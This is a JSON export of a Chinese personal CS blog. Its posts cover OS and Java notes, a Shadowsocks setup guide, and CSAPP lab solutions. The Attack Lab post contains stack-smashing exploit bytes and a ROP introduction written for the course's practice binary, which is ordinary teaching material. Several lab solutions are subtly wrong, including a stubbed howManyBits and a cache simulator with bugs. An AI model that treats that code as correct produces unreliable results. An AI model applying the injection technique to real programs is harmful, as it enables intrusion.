{"pages":[{"title":"About","date":"2018-01-08T21:53:40.642Z","path":"about/index.html","text":""},{"title":"Categories","date":"2018-01-08T21:53:40.646Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2018-01-08T21:53:40.644Z","path":"tags/index.html","text":""}],"posts":[{"title":"超线程","date":"2018-07-11T16:00:00.000Z","path":"2018/07/12/OS-超线程/","text":"Intel的超线程技术(Hyper-Threading Technology, HTT)最早出现在2002年2月发布的Xeon处理器上，并于同年底应用在Pentium 4处理器中[1]。超线程技术使一个单一核处理器看起来像多核处理器。对于每一个逻辑核都有架构状态(architecture state，see wiki)的拷贝，并且逻辑核能够共享物理处理资源[2]。 架构状态(architecture state)由寄存器组成，包括general-purpose registers, the control registers, the advanced programmable interrupt controller (APIC) registers, 和一些machine state registers[2~~~~]. 使用超线程技术能够提高处理器性能： Hyper-threading Hyper-Threading Technology Architecture and Microarchitecture","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"}]},{"title":"POSIX","date":"2018-07-11T16:00:00.000Z","path":"2018/07/12/OS-POSIX/","text":"可移植操作系统接口(POSIX, Portable Operating System Interface)，是基于现有的UNIX 实践和经验，描述了操作系统的调用服务接口，用于保证编制的应用程序可以在源代码一级上在多种操作系统上移植运行[1]。 当前的POSIX主要分为四个部分: Base Definitions、System Interfaces、Shell and Utilities和Rationale. [1] Kardinal. 开源世界旅行手册","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"}]},{"title":"修饰词native","date":"2018-07-11T16:00:00.000Z","path":"2018/07/12/Java-关键字native/","text":"在Class Object中一个wait()方法定义为： 1public final native void wait(long timeout) throws InterruptedException; 这里的native修饰词说明其修饰的方法的实现，是用其他语言(C/C++)实现的，该方法通过JNI调用本地代码。 JNIJNI(Java Native Interface, Java本地接口)使Java虚拟机中的Java程序可以调用本地代码。","tags":[{"name":"Java","slug":"Java","permalink":"http://larryim.cc/tags/Java/"}],"categories":[{"name":"Java","slug":"Java","permalink":"http://larryim.cc/categories/Java/"}]},{"title":"Java record","date":"2018-07-11T16:00:00.000Z","path":"2018/07/12/Java-record/","text":"记录在开发过程中遇到的java常见小问题、细节问题。 获得二维数组长度123char[][] boardint n = board.length;int m = n &gt; 0 ? board[0].length : 0; 初始化二维数组https://stackoverflow.com/questions/13832880/initialize-2d-array 1private char[][] table = &#123;&#123;'1', '2', '3'&#125;, &#123;'4', '5', '6'&#125;, &#123;'7', '8', '9'&#125;&#125;; 排序二维数组按照第1个元素排序： 123Arrays.sort(myArr, (a, b) -&gt; Double.compare(a[0], b[0]));Arrays.sort(queries, Comparator.comparing(a -&gt; a[0]));Arrays.sort(queries, (a, b) -&gt; a[0] - b[0]); 打印数组https://stackoverflow.com/questions/409784/whats-the-simplest-way-to-print-a-java-array 123System.out.println(Arrays.toString(array));Nested Array:System.out.println(Arrays.deepToString(deepArray)); java中int转成String位数不足前面补零1String.format(\"%06\",12);//其中0表示补零而不是补空格，6表示至少6位 Java最小值和最大值Integer.MIN_VALUE和Integer.MAX_VALUE 将List转化为数组使用 12List&lt;String&gt; list = new ArrayList&lt;String&gt;();String[] a = list.toArray(new String[0]); 而不是 123List&lt;String&gt; list = new ArrayList&lt;String&gt;();...String[] a = (String[]) list.toArray(list); 但是一下做法是错误的 123List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();...int[] a = list.toArray(new int[0]); 原因就在与int不能作为范型类型参数(use int as a type argument for generics)。所以只能利用Java8的新特性了： 1int[] array = list.stream().mapToInt(i-&gt;i).toArray(); 将数组转化为List1Arrays.asList(spam); https://stackoverflow.com/questions/1073919/how-to-convert-int-into-listinteger-in-java 1List&lt;Integer&gt; list = Arrays.stream(ints).boxed().collect(Collectors.toList()); Java数组拷贝cloneclone方法是从Object类继承过来的，基本数据类型（String ，boolean，char，byte，short，float ，double，long）都可以直接使用clone方法进行克隆，注意String类型是因为其值不可变所以才可以使用。 12int[] a1 = &#123;1, 3&#125;;int[] a2 = a1.clone(); System.arraycopy12public static native void arraycopy(Object src, int srcPos, Object dest, int desPos, int length) 由于是native方法，所以效率非常高，在频繁拷贝数组的时候，建议使用。","tags":[{"name":"Java","slug":"Java","permalink":"http://larryim.cc/tags/Java/"}],"categories":[{"name":"Java","slug":"Java","permalink":"http://larryim.cc/categories/Java/"}]},{"title":"","date":"2018-03-01T14:52:38.441Z","path":"2018/03/01/C-面试题/","text":"","tags":[],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"Mac禁止访问网站","date":"2018-02-01T16:00:00.000Z","path":"2018/02/02/小技巧-Mac禁止访问网站/","text":"最近总是在用电脑的时候，访问一些信息网站，浪费了大量宝贵的时间。在MAC上，禁止访问某些网站，可以直接通过修改host进行。打开终端，在终端输入 sudo vim /etc/hosts 然后输入密码，然后添加”127.0.0.1”+网址（星号代表子域名）。比如： 123127.0.0.1 www.zhihu.com127.0.0.1 *.360.cn127.0.0.1 指定的网址","tags":[{"name":"website","slug":"website","permalink":"http://larryim.cc/tags/website/"},{"name":"mac","slug":"mac","permalink":"http://larryim.cc/tags/mac/"}],"categories":[{"name":"小技巧","slug":"小技巧","permalink":"http://larryim.cc/categories/小技巧/"}]},{"title":"","date":"2018-01-05T21:24:09.988Z","path":"2018/01/06/index/","text":"分享、记录CS 内容包括： Leetcode CSAPP TensorFlow 常用软件配置安装 Name: 王振华BLOG: http://larryim.cc","tags":[],"categories":[]},{"title":"搭建shadowsocks","date":"2017-12-31T16:00:00.000Z","path":"2018/01/01/awesome-Install-shadowsocks/","text":"Shadowsocks简介Shadowsocks(ss) 是由 Clowwindy 开发的一款软件，其作用本来是加密传输资料。当然，也正因为它加密传输资料的特性，使得GFW没法将由它传输的资料和其他普通资料区分开来（上图），也就不能干扰我们访问那些「不存在」的网站了。 VPS简介VPS(Virtual private server) 译作虚拟专用伺服器。你可以把它简单地理解为一台在远端的强劲电脑。当你租用了它以后，可以给它安装操作系统、软件，并通过一些工具连接和远程操控它。 「搬瓦工」是一家 VPS 服务器提供商，有美国、亚洲、欧洲等多地的 VPS。它家的服务器以性价比高、访问速度快闻名。 Linux 和 SSH简介Linux是免费开源的操作系统，大概被世界上过半服务器所采用。有大量优秀的开源软件可以安装，上述 Shadowsocks 就是其一。你可以通过命令行来直接给Linux 操作系统「下命令」，比如 $ cd ~/Desktop 就是进入你根目录下的 Desktop 文件夹。 而 SSH 是一种网络协议，作为每一台 Linux 电脑的标准配置，用于计算机之间的加密登录。当你为租用的 VPS 安装 Linux 系统后，只要借助一些工具，就可以用 SSH 在你自己的 Mac/PC 电脑上远程登录该 VPS 了。 部署 ShadowsocksShadowsocks 需要同时具备客户端和服务器端，所以它的部署也需要分两步。 部署 Shadowsocks 服务器端这里使用teddysun 的一键安装脚本。 以下是3条命令，每次输入一行、回车，等待屏幕上的操作完成后再输入下一条。 123wget --no-check-certificate [https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh](https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh)chmod +x shadowsocks.sh./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 最后一步输完，你应该会看到下图中内容──是要你为Shadowsocks 服务设置一个个人密码。 输好回车后会让你选择一个端口，输入1–65535间的数字都行。 遵照上图指示，按任意键开始部署Shadowsocks。这时你什么都不用做，只需要静静地等它运行完就好。结束后就会看到你所部署的Shadowsocks的配置信息。 记住其中黄框中的内容，也就是服务器 IP、服务器端口、你设的密码和加密方式。 3.2 TCP Fast Open实际上只要具备上述四个信息，你就可以在自己的任意设备上进行登录使用了。但是为了更好的连接速度，你还需要多做几步。 首先是打开 TCP Fast Open，输入以下命令，意为用 nano 这个编辑器打开一个文件。 1nano /etc/rc.local 你的「终端」会刷新一下，出现下图。 别慌张，它就是个文本编辑器。用方向键把光标移到最末端，粘贴下面这一行内容，然后按 Ctrl + X退出。 1echo 3 &gt; /proc/sys/net/ipv4/tcp_fastopen 输入“Y”并回车确认退出。 然后依法炮制，输入： 1nano /etc/sysctl.conf 在文末加上下面的内容，保存退出。 1net.ipv4.tcp_fastopen = 3 再打开一个Shadowsocks 配置文件。 1nano /etc/shadowsocks.json 把其中 “fast_open” 一项的 false 替换成 true。 1&quot;fast_open&quot;:true 如果你希望添加多用户的话，可以将 “password” 字段如下图修改。其中，”22345”:”password1”意为该用户使用 22345 端口、以“password1”为密码连接登录Shadowsocks。 保存退出。最后，输入以下命令重启 Shadowsocks。 1/etc/init.d/shadowsocks restart 3.3安装Shadowsocks客户端相比服务器端的安装，客户端的安装就简单了许多。首先，根据操作系统下载相应的客户端。 Mac 版客户端下载 Win 版客户端下载 打开客户端，在「服务器设定」(Servers-Open Server Preferences)里新增服务器。然后依次填入服务器 IP、服务器端口、你设的密码和加密方式。 然后启用代理，就可以实现科学上网了。","tags":[{"name":"ss","slug":"ss","permalink":"http://larryim.cc/tags/ss/"}],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"Git","date":"2017-12-31T16:00:00.000Z","path":"2018/01/01/TOOLS-Git/","text":"在git pull时出现的问题fatal: refusing to merge unrelated histories。 处理方案，添加--allow-unrelated-histories. repositories 合并You can merge repository A into a subdirectory of a project B using the subtree merge strategy. 12345git remote add -f Bproject /path/to/Bgit merge -s ours --allow-unrelated-histories --no-commit Bproject/mastergit read-tree --prefix=dir-B/ -u Bproject/mastergit commit -m \"Merge B project as our subdirectory\"git pull -s subtree Bproject master","tags":[{"name":"Git","slug":"Git","permalink":"http://larryim.cc/tags/Git/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"Lab1 Data Lab","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/CSAPP-Lab-Data-Lab/","text":"位操作bitXor - x^y using only ~ and &amp; Example: bitXor(4, 5) = 1 Legal ops: ~ &amp; Max ops: 14 123int bitXor(int x, int y) &#123; return ~(x&amp;y)&amp;(~((~x)&amp;(~y)));&#125; allOddBits - return 1 if all odd-numbered bits in word set to 1 Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 12 123456int allOddBits(int x) &#123; int v = 0xAA; v = v | (v &lt;&lt; 8); v = v | (v &lt;&lt; 16); return !(((x &amp; v) | (~v)) +1);&#125; isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’) Example: isAsciiDigit(0x35) = 1. isAsciiDigit(0x3a) = 0. isAsciiDigit(0x05) = 0. Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 15 123int isAsciiDigit(int x) &#123; return (!(~(x &gt;&gt; 8)+1))&amp;(!((x-0x30)&gt;&gt;31))&amp;(!(((x-0x3a)&gt;&gt;31)+1));&#125; conditional - same as x ? y : z Example: conditional(2,4,5) = 4 Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 16 123456789// repeatint conditional(int x, int y, int z) &#123; /* *if x!=0,mask=0x00000000, y&amp;~mask=y and z&amp;mask=0 *if x==0,mask=0xffffffff, y&amp;~mask = y&amp;0 =0; z&amp;mask=z */ int mask= ~!x+1; return (y &amp; ~mask)|(z &amp; mask);&#125; logicalNeg - implement the ! operator, using all of the legal operators except ! Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 12 123int logicalNeg(int x) &#123; return !(~(x-1));&#125; 补码运算tmin - return minimum two’s complement integer Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 4 123int tmin(void) &#123; return 1&lt;&lt;31;&#125; isTmax - returns 1 if x is the maximum, two’s complement number, and 0 otherwise Legal ops: ! ~ &amp; ^ | + Max ops: 10 123int isTmax(int x) &#123; return !((~x) ^ (x + 1)) &amp; !!(~x);&#125; negate - return -x Example: negate(1) = -1. Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 5 123int negate(int x) &#123; return ~(x-1);&#125; isLessOrEqual - if x &lt;= y then return 1, else return 0 Example: isLessOrEqual(4,5) = 1. Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 24 123int isLessOrEqual(int x, int y) &#123; return (!(((x-y)&gt;&gt;31)+1)) || (!(x-y));&#125; howManyBits - return the minimum number of bits required to represent x in two’s complement Examples: howManyBits(12) = 5, howManyBits(298) = 10, howManyBits(-5) = 4, howManyBits(0) = 1, howManyBits(-1) = 1, howManyBits(0x80000000) = 32 Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; Max ops: 90 Rating: 4 123int howManyBits(int x) &#123; return 4;&#125; 浮点数运算float_twice - Return bit-level equivalent of expression 2*f forfloating point argument f. Both the argument and result are passed as unsigned int’s, but they are to be interpreted as the bit-level representation of single-precision floating point values. When argument is NaN, return argument Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, whileMax ops: 30 12345678910111213141516unsigned float_twice(unsigned uf) &#123; unsigned sign = uf &amp; 0x80000000; unsigned exp = uf &amp; 0x7f800000; unsigned frac = uf &amp; 0x007FFFFF; if (exp==0x7F800000) // when argument is NaN, return argument return uf; if (exp == 0x0) // 无规格化的情况 return sign | (frac &lt;&lt; 1); if (exp == 0x7f000000)// 会变成无穷大 frac = 0x0; return sign|(exp+0x800000)|frac; &#125; float_i2f - Return bit-level equivalent of expression (float) xResult is returned as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point values. Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while Max ops: 30 12345678910111213141516171819202122 unsigned float_i2f(int x) &#123; //Rounding is important! unsigned sign=0,shiftleft=0,flag=0,tmp; unsigned absx=x; if( x==0 ) return 0; if( x&lt;0 )&#123; sign=0x80000000; absx=-x; &#125; while(1)&#123;//Shift until the highest bit equal to 1 in order to normalize the floating-point number tmp=absx; absx&lt;&lt;=1; shiftleft++; if( tmp&amp;0x80000000 ) break; &#125; //round to even if( (absx &amp; 0x01ff) &gt; 0x0100 ) flag=1;//向上舍入 if( (absx &amp; 0x03ff) == 0x0300 ) flag=1;//中间值，向偶数舍入 return sign+(absx&gt;&gt;9)+((159-shiftleft)&lt;&lt;23)+flag; &#125; float_f2i - Return bit-level equivalent of expression (int) ffor floating point argument f. Argument is passed as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point value. Anything out of range (including NaN and infinity) should return 0x80000000u. Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while Max ops: 30 1234567891011121314151617181920212223242526272829int float_f2i(unsigned uf) &#123; int sign = (uf&gt;&gt;31)==0 ? 1: -1; //最高位 int exp = uf&amp;0x7f800000; //中间8位 unsigned frac = uf&amp;0x007FFFFF; //最低23位 //特殊情况NaN, inf if (exp==0x7f800000) return 0x80000000u; //特殊情况：0 if (uf==0x800000) return 0; //非规格化 if (exp==0) exp = 1-127; //1-bias else //规格化 &#123; exp = (exp&gt;&gt;23)-127;// exp-bias; frac = 1+frac; // frac+=1; &#125; // 如果小于0.5, 那么应该等于0 if (exp &lt; -1) return 0; return sign * (frac &lt;&lt; exp);&#125;","tags":[{"name":"CSAPP","slug":"CSAPP","permalink":"http://larryim.cc/tags/CSAPP/"}],"categories":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"http://larryim.cc/categories/CSAPP-Lab/"}]},{"title":"Lab4 Cache Lab","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/CSAPP-Lab-Cache-Lab/","text":"CMU 15-213 Lab4 Cache Lab Lab 下载地址 Recitation讲解 Cache Lab可以帮助理解缓存对C程序的影响。Lab包括两部分，第一部分用C语言写一个缓存模拟器，第二部分写一个小型矩阵的转置函数，使缓存不命中降到最低。 Part APart A的任务是写一个C语言缓存模拟器，输入Valgrind的trace file，输出缓存命中次数hit_count，缓存不命中次数miss_count,驱逐次数eviction_count. Trance File要写这样一个缓存模拟器，我们肯定首先要了解输入的内容。Valgrind的--trace-mem=yes选项可以追踪内存： 1234567$ valgrind --log-fd=1 --tool=lackey -v --trace-mem=yes ls -l L 04224488,4I 0400a0ab,8 S ffefffdf8,8I 0400a0b3,5 M ffefffd48,8 上面这个命令用valgrind打印出了在执行ls -l过程中内存的使用情况。输出的格式是 12[空格] 操作符(I/L/S/M) 地址, 字节大小[space] operator(I/L/S/M) address, size 操作符有四种I/L/S/M，分别代表指令加载(I)/数据加载(L)/数据存储(S)/M(数据修改)。其中指令加载(I)前面没有空格。 命令行参数接下来还需要了解命令行参数，缓存模拟器可以根据命令行参数设置成不同的规格。例如： 1./csim-ref -s 4 -E 1 -b 4 其中-s, -E, -b分别表示： -s &lt;s&gt; 有$S=2^s$个组， -E &lt;E&gt; E个相联度，即每组E行 -b &lt;b&gt; 每一行是由一个$B=2^b$字节的数据块组成。 所以-s 4 -E 1 -b 4表示，高速缓存有16个组，每组1行，每一行是由一个16个字节的数据块组成的。 解析命令行参数可以使用getopt函数，在使用时包含unistd.h头文件。可使用man 3 getopt查询函数用法和示例。 12getopt -- get option character from command line argument listgetopt(int argc, char * const argv[], const char *optstring); 字符串optstring可以下列元素， 单个字符，表示选项， 单个字符后接一个冒号：表示该选项后必须跟一个参数。参数紧跟在选项后或者以空格隔开。该参数的指针赋给optarg。 单个字符后跟两个冒号, 这时选项的参数是可选的(可有可无)。有参数时，参数与选项之间不能有空格 所以输入时的处理可以如下： 12345678910111213141516171819202122while((opt=getopt(argc, argv, &quot;s:E:b:t:v::&quot;)) != -1)&#123; printf(&quot;-%c %s &quot;, opt, optarg); switch (opt) &#123; case &apos;s&apos;: s = atoi(optarg); break; case &apos;E&apos;: E = atoi(optarg); break; case &apos;b&apos;: b = atoi(optarg); break; case &apos;t&apos;: filename = optarg; break; default: printf(&quot;Wrong argumet \\n&quot;); break; &#125;&#125; 读取文件用getopt()函数处理完命令行参数，也就知道了需要模拟的高速缓存的具体细节。下一步就是读取Valgrind文本文件，进行处理。 使用fscanf()函数可以很方便的从文件中读取内容。同样的用man 3 fscanf可以查询fscanf()的具体用法： 1int fscanf(FILE *stream, const char *format, ...); fscanf()依次输入trace file中的[space]operator/address/size。由于地址的长度大小不一定，所以用malloc()动态分配。fscanf()中的%[^,]表示读入任意多的字符，直到遇到逗号(,)为止。 1while(fscanf(fp, \" %c %[^,],%c\", &amp;operator, address, &amp;size)==3) 注意在调用fscanf()函数时，要确认函数返回值是否等于要赋值的参数数量fscanf()==3。 模拟缓存前面的几步都是为了这一步做好准备，现在知道了缓存的细节，读取了trace file, 下一步就是要构造一个缓存了。可以用一个多维数组构造缓存，其中一维表示组，一维表示行，另一维表示块。其实它也就是一个二维的缓存行，每一行有$B$字节，有$S$组，每组$E$行，一共有$S\\times E$行。那么，我们先构造一个缓存行，然后再构造一个$S\\times E$行的数组。 123456struct cacheline &#123; int valid_bit; // if 1, valid unsigned tag; // tag &#125;struct cache_line cache[S][E] 接下来的一个难点是如何部署LRU(Least Recently Used replacement policy)策略。一个好的方法是使用队列, 在节点中存放地址。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#define QUEUE_TYPE cacheline/* define node of queue*/typedef struct queue_node &#123; QUEUE_TYPE* value; struct queue_node* next;&#125; node;/* define a queue */typedef struct &#123; int size; int full_size; node *head; node *tail;&#125; queue;/* create a queue */queue* create_queue(queue* q, int full_size)&#123; q = malloc(sizeof(queue)); if (q==NULL) &#123; printf(\"Memory error\"); exit(1); &#125; q-&gt;size = 0; q-&gt;full_size = full_size; return q;&#125;/* pop_queue */QUEUE_TYPE* pop(queue *q)&#123; node *old_head; QUEUE_TYPE* old_value; old_head = q-&gt;head; q-&gt;head = q-&gt;head-&gt;next; q-&gt;size -= 1; old_value = old_head-&gt;value; free(old_head); return old_value;&#125;/* queue is empty */int is_empty(queue *q)&#123; return (q-&gt;size == 0); &#125;/* queue is full */int is_full(queue *q)&#123; return (q-&gt;size == q-&gt;full_size);&#125;/* destory_queue */void destroy(queue *q)&#123; while (!is_empty(q)) pop(q);&#125;/* push_queuq */QUEUE_TYPE* push(queue *q, QUEUE_TYPE* value)&#123; /* create a new node */ node *new_node; new_node = malloc(sizeof(node)); new_node-&gt;value = value; if (is_empty(q)) &#123; q-&gt;head = new_node; q-&gt;tail = new_node; q-&gt;size = 1; return value; &#125; else &#123; q-&gt;tail-&gt;next = new_node; q-&gt;tail = new_node; q-&gt;size = q-&gt;size + 1; if ((q-&gt;size) &gt; (q-&gt;full_size)) return pop(q); &#125; &#125; 下面就是细节的处理了，包括内存分配，从地址中提取标记，组索引，块偏移，把输入的16进制字符串转化为数字。这些都非常简单，最终主程序如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &quot;queue.h&quot;/* 将十六进制字符串转换为十进制整数 */int hexstr2int(char * HexStr)&#123; int iResult = 0, iCycle = 1; //判断字符串是否合法 if( !strlen( HexStr ) ) &#123; return -1; &#125; //指针变量p指向字符串的末尾 char * p = HexStr + strlen( HexStr ); while( (--p+1) != HexStr ) &#123; if ( *p &gt;= &apos;0&apos; &amp;&amp; *p &lt;= &apos;9&apos; ) iResult += ( *p - &apos;0&apos; )*iCycle; else if ( *p &gt;= &apos;A&apos; &amp;&amp; *p &lt;= &apos;F&apos; ) iResult += ( *p - &apos;A&apos; + 10 )*iCycle; else if ( *p &gt;= &apos;a&apos; &amp;&amp; *p &lt;= &apos;f&apos; ) iResult += ( *p - &apos;a&apos; + 10 )*iCycle; iCycle &lt;&lt;= 4; &#125; return iResult;&#125;int main(int argc, char *argv[])&#123; int opt; int s, E, b; /* cache parameter */ int S, B; int miss=0, hit=0, eviction=0; /* count on miss/hit/eviction */ int i, j, flag=0; /* dummy variable */ char *filename; queue *q, *qi; cacheline **cache; // every cache has S set, every set has E lines cacheline cacheij, *cacheij_address; //dummy variable FILE *fp; char operator, *address, size; unsigned d_address, tag, set, bit; // 地址，标记(t)，组索引(s)，块偏移(b) while((opt=getopt(argc, argv, &quot;s:E:b:t:v::&quot;)) != -1) &#123; printf(&quot;-%c %s &quot;, opt, optarg); switch (opt) &#123; case &apos;s&apos;: s = atoi(optarg); break; case &apos;E&apos;: E = atoi(optarg); break; case &apos;b&apos;: b = atoi(optarg); break; case &apos;t&apos;: filename = optarg; break; default: printf(&quot;Wrong argumet \\n&quot;); break; &#125; &#125; printf(&quot;\\n&quot;); S = 2 &lt;&lt; s; B = 2 &lt;&lt; b; /* allocate memory */ cache = (cacheline **) malloc(sizeof(cacheline*) *S); address = (char *) malloc(sizeof(char) * 16); q = (queue *) malloc(sizeof(queue) * S); for (qi=q, i=0; i&lt;S; qi++, i++) &#123; cache[i] = (cacheline *) malloc(sizeof(cacheline) *E); /* 每一个缓存组都有E个缓存行 */ qi-&gt;full_size = E; for (j=0; j&lt; E; j++) &#123; /* 设定缓存行 */ cacheij = cache[i][j]; cacheij.valid_bit = 0; cacheij.tag = i*E+j; &#125; &#125; /* open file */ fp = fopen(filename, &quot;r&quot;); if(fp == NULL) &#123; printf(&quot;Open filefailure!&quot;); exit(1); &#125; else &#123; /* read trace data */ while(fscanf(fp, &quot; %c %[^,],%c&quot;, &amp;operator, address, &amp;size)==3) &#123; printf(&quot;%c %s,%c &quot;, operator, address, size); /* process address */ d_address = hexstr2int(address); tag = d_address &gt;&gt; (b+s); /* 标记t */ set = (d_address &amp; ((1&lt;&lt;(b+s))-1)) &gt;&gt; b; /* 组索引s */ bit = (d_address) &amp; ((1&lt;&lt;b)-1); /* 块偏移b, 其实模拟时没用，但还是写上 */ printf(&quot; address: %x, tag:%d, set:%d, bit:%d &quot;, d_address, tag, set, bit); /* 找到缓存行，根据操作符（I，L，S，M)，进行操作 */ if (operator == &apos;L&apos; || operator == &apos;S&apos; || operator == &apos;M&apos;) &#123; /* 首先根据标记，找到行 */ flag = 0; /* if flag=0, we didn&apos;t find it */ for (i=0; i&lt;E; i++) &#123; cacheij_address = &amp;cache[set][i]; if ((cacheij_address-&gt;tag == tag) &amp; (cacheij_address-&gt;valid_bit)) /* OK, find it */ &#123; flag = 1; hit += 1; printf(&quot;hit &quot;); break; &#125; &#125; if (!flag) &#123; /* we can&apos;t find it! */ printf(&quot;miss &quot;); miss += 1; /* set is full or not */ if (is_full(&amp;q[set])) &#123; /* it&apos;s full, pop a cache_line, fill in and push it */ cacheij_address = pop(&amp;q[set]); cacheij_address-&gt;tag = tag; push(&amp;q[set], cacheij_address); eviction += 1; printf(&quot;eviction &quot;); &#125; else &#123; /* find the uncached cache_line, and fill in */ for (i=0; i&lt;E; i++) &#123; cacheij_address = &amp;cache[set][i]; if (!cacheij_address-&gt;valid_bit) &#123; cacheij_address-&gt;tag = tag; cacheij_address-&gt;valid_bit = 1; push(&amp;q[set], cacheij_address); break; &#125; &#125; &#125; &#125; /* if &quot;M&quot; */ if (operator == &apos;M&apos;) &#123; hit += 1; printf(&quot;hit &quot;); &#125; &#125; printf(&quot;\\n&quot;); &#125; &#125; printf(&quot;hits:%d misses:%d evictions:%d&quot;, hit, miss, eviction); //free the memory of cache for (i=0; i&lt;S; i++) free(cache[i]); free(address); fclose(fp); //printSummary(0, 0, 0); return 1;&#125;","tags":[{"name":"CSAPP","slug":"CSAPP","permalink":"http://larryim.cc/tags/CSAPP/"}],"categories":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"http://larryim.cc/categories/CSAPP-Lab/"}]},{"title":"Lab3 Attack Lab","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/CSAPP-Lab-Attack-Lab/","text":"CMU 15-213 Lab3 Attack Lab Lab 下载地址 Recitation讲解 Phase3Phase3的任务是调用touch3函数，并传入cookie字符串。所涉及的函数的代码是： 123456789101112131415161718int hexmatch(unsigned val, char *sval)&#123; char cbuf[110]; char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0;&#125;void touch3(char *sval)&#123; vlevel = 3; if (hexmatch(cookie, sval))&#123; printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); &#125; else &#123; printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); &#125; exit(0);&#125; touch3函数会调用函数hexmatch进行，对比传入的sval字符串(也就是我们要传入的cookie)是否和程序内部的cookie一致。所以我们应该大致清楚attack的步骤： 传入参数sval到touch3, 由于sval是字符串指针，所以我们要在%rdi(Arg1 寄存器)中放入字符串的地址。 把字符串放在栈中，但是要防止函数调用时将其覆盖。 设置touch3函数的地址为返回值地址。 这题稍微有些复杂，我们一步一步来，先把cookie(0x59b997fa) 转换成字符串的表达形式，也就是 10x59b997fa-&gt; 35 39 62 39 39 37 66 61 00 在Linux下，可用man ascii查找字符所对应的ascii码。 然后构造注入代码，touch3的地址为0x4018fa, 根据phase2我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28, 字符串存放的地址应为%rsp+0x30. 1234#phase3.smovq $0x5561dc98,%rdi pushq $0x004018faretq 执行命令 12$ gcc -c phase3.s$ objdump -d phase3.o &gt; phase3.d 得到字节码48 c7 c7 98 dc 61 55 68 fa 18 40 00 c3: 123456789phase3.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 98 dc 61 55 mov $0x5561dc98,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 生成最终的字节码： 123456748 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 0035 39 62 39 39 37 66 61 运行结果 123456789$ cat phase3.txt | ./hex2raw | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(\"59b997fa\")Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 Phase 4从Phase4开始，攻击手段变为ROP(Return-Oriented Programming), 并且使用了栈随机化和限制可执行代码区域。ROP使用现存的代码进行攻击，而不是注入攻击代码。使用ROP的诀窍是找到现存程序中存在ret指令的代码。这些代码一般被叫做gadget. Phase4的任务与Phase2相同，传递cookie(0x59b997fa)到touch2(0x4017ec), 但是攻击的程序变成rtarget. rtarge内的gadget限定在start_farm和mid_farm之间。 要把cookie作为一个参数，我们只能把cookie写入到(%rsp)，然后弹出。所以首先我们要查找pop指令，pop系列指令如下 所以我们要查找5x c3这样的指令，x可以指代8,9,a,b,c,d,e,f。然后再查找mov指令。构成pop %x; mov %x %rdi; ret这样的指令，完成cookie传送。其中mov指令如下： 还有有两个比较重要的指令 ret: 返回 0xc3 nop: 什么都不做，只是让程序计数器加一 0x90 由于0x90没有任何意义，所以它可以出现在任何地方。 